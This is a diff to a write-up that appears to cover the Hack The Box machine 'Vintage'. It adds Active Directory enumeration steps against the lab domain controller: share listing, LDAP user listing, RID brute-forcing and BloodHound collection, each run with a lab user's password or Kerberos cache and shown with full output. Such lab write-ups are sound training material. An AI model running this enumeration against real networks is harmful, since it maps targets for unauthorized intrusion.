@@ -212,14 +212,118 @@ malloc(): unaligned fastbin chunk detected
 Aborted
 ```
 
-### 2.3. Active Directory discovery: Bloodhound
+### 2.3. Active Directory discovery
 
-Let's figure out if there are any viable lateral movement pathways
+#### 2.3.1. Getting some information
 
-#### 2.3.1. Generating bloodhound packages
+Get shares
 
 ```console
-root@kali:~# bloodhound-python -d vintage.htb -u P.Rosa -p Rosaisbest123 -ns 10.10.11.45 -c all  --dns-tcp --zip
+root@kali:~# crackmapexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -d vintage.htb --use-kcache --shares
+SMB         dc01.vintage.htb 445    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
+SMB         dc01.vintage.htb 445    dc01.vintage.htb [+] vintage.htb\ from ccache
+SMB         dc01.vintage.htb 445    dc01.vintage.htb [+] Enumerated shares
+SMB         dc01.vintage.htb 445    dc01.vintage.htb Share           Permissions     Remark
+SMB         dc01.vintage.htb 445    dc01.vintage.htb -----           -----------     ------
+SMB         dc01.vintage.htb 445    dc01.vintage.htb ADMIN$                          Remote Admin
+SMB         dc01.vintage.htb 445    dc01.vintage.htb C$                              Default share
+SMB         dc01.vintage.htb 445    dc01.vintage.htb IPC$            READ            Remote IPC
+SMB         dc01.vintage.htb 445    dc01.vintage.htb NETLOGON        READ            Logon server share
+SMB         dc01.vintage.htb 445    dc01.vintage.htb SYSVOL          READ            Logon server share
+```
+
+Get users
+
+```console
+root@kali:~# netexec ldap dc01.vintage.htb -d vintage.htb -u P.Rosa -k --use-kcache --users
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb [+] vintage.htb\P.Rosa from ccache
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb [*] Enumerated 14 domain users: vintage.htb
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb -Username-                    -Last PW Set-       -BadPW- -Description-
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb Administrator                 2024-06-08 11:34:54 0       Built-in account for administering the computer/domain
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb Guest                         2024-11-13 14:16:53 1       Built-in account for guest access to the computer/domain
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb krbtgt                        2024-06-05 10:27:35 0       Key Distribution Center Service Account
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb M.Rossi                       2024-06-05 13:31:08 1
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb R.Verdi                       2024-06-05 13:31:08 1
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb L.Bianchi                     2024-06-05 13:31:08 1
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb G.Viola                       2024-06-05 13:31:08 1
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb C.Neri                        2024-06-05 21:08:13 0
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb P.Rosa                        2024-11-06 12:27:16 0
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb svc_sql                       2024-12-30 01:52:04 0
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb svc_ldap                      2024-06-06 13:45:27 0
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb svc_ark                       2024-06-06 13:45:27 1
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb C.Neri_adm                    2024-06-07 10:54:14 0
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb L.Bianchi_adm                 2024-11-26 11:40:30 1
+```
+
+Get RIDs
+
+```console
+root@kali:~# netexec smb dc01.vintage.htb -d vintage.htb -u P.Rosa -k --use-kcache --rid-brute
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa from ccache
+SMB         dc01.vintage.htb 445    dc01             498: VINTAGE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             500: VINTAGE\Administrator (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             501: VINTAGE\Guest (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             502: VINTAGE\krbtgt (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             512: VINTAGE\Domain Admins (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             513: VINTAGE\Domain Users (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             514: VINTAGE\Domain Guests (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             515: VINTAGE\Domain Computers (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             516: VINTAGE\Domain Controllers (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             517: VINTAGE\Cert Publishers (SidTypeAlias)
+SMB         dc01.vintage.htb 445    dc01             518: VINTAGE\Schema Admins (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             519: VINTAGE\Enterprise Admins (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             520: VINTAGE\Group Policy Creator Owners (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             521: VINTAGE\Read-only Domain Controllers (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             522: VINTAGE\Cloneable Domain Controllers (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             525: VINTAGE\Protected Users (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             526: VINTAGE\Key Admins (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             527: VINTAGE\Enterprise Key Admins (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             553: VINTAGE\RAS and IAS Servers (SidTypeAlias)
+SMB         dc01.vintage.htb 445    dc01             571: VINTAGE\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         dc01.vintage.htb 445    dc01             572: VINTAGE\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         dc01.vintage.htb 445    dc01             1002: VINTAGE\DC01$ (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             1103: VINTAGE\DnsAdmins (SidTypeAlias)
+SMB         dc01.vintage.htb 445    dc01             1104: VINTAGE\DnsUpdateProxy (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             1107: VINTAGE\gMSA01$ (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             1108: VINTAGE\FS01$ (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             1111: VINTAGE\M.Rossi (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             1112: VINTAGE\R.Verdi (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             1113: VINTAGE\L.Bianchi (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             1114: VINTAGE\G.Viola (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             1115: VINTAGE\C.Neri (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             1116: VINTAGE\P.Rosa (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             1120: VINTAGE\IT (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             1121: VINTAGE\HR (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             1122: VINTAGE\Finance (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             1123: VINTAGE\ServiceAccounts (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             1131: VINTAGE\DelegatedAdmins (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             1134: VINTAGE\svc_sql (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             1135: VINTAGE\svc_ldap (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             1136: VINTAGE\svc_ark (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             1137: VINTAGE\ServiceManagers (SidTypeGroup)
+SMB         dc01.vintage.htb 445    dc01             1140: VINTAGE\C.Neri_adm (SidTypeUser)
+SMB         dc01.vintage.htb 445    dc01             1141: VINTAGE\L.Bianchi_adm (SidTypeUser)
+```
+
+#### 2.3.2. BloodHound
+
+Generating bloodhound packages
+
+```console
+root@kali:~# netexec ldap dc01.vintage.htb -d vintage.htb -u P.Rosa -k --use-kcache --bloodhound --collection All --dns-server 10.10.11.45
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb [+] vintage.htb\P.Rosa from ccache
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb Resolved collection methods: container, group, psremote, dcom, objectprops, session, trusts, rdp, localadmin, acl
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb Using kerberos auth without ccache, getting TGT
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb Using kerberos auth from ccache
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb Done in 00M 01S
+LDAP        dc01.vintage.htb 389    dc01.vintage.htb Compressing output into /root/.nxc/logs/dc01.vintage.htb_dc01.vintage.htb_2024-12-30_101430_bloodhound.zip
+```
+
+```console
+root@kali:~# bloodhound-python -d vintage.htb -u P.Rosa -p Rosaisbest123 -ns 10.10.11.45 -c all --dns-tcp --zip
 INFO: Found AD domain: vintage.htb
 INFO: Getting TGT for user
 INFO: Connecting to LDAP server: dc01.vintage.htb
